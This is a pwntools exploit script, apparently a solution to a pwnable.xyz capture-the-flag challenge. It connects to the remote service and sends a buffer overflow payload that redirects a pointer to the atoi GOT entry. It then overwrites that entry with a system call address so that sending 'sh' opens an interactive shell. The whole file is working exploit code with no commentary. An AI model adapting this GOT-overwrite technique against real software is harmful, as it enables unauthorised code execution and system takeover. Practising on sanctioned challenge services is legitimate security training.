from pwn import *

win = 0x40093c
puts_plt = 0x601220
system_call = 0x400750
atoi_plt = 0x601268

p = process('./challenge')
p = remote('svc.pwnable.xyz', 30016)

p.sendlineafter('>', str(1))
p.sendlineafter('?', str(0x28))
p.sendafter(':', 'AAAAAAAA'*4 + p64(atoi_plt))

p.sendlineafter('>', str(2))
p.sendlineafter(':', p64(system_call))

p.sendlineafter('>', 'sh')
p.interactive()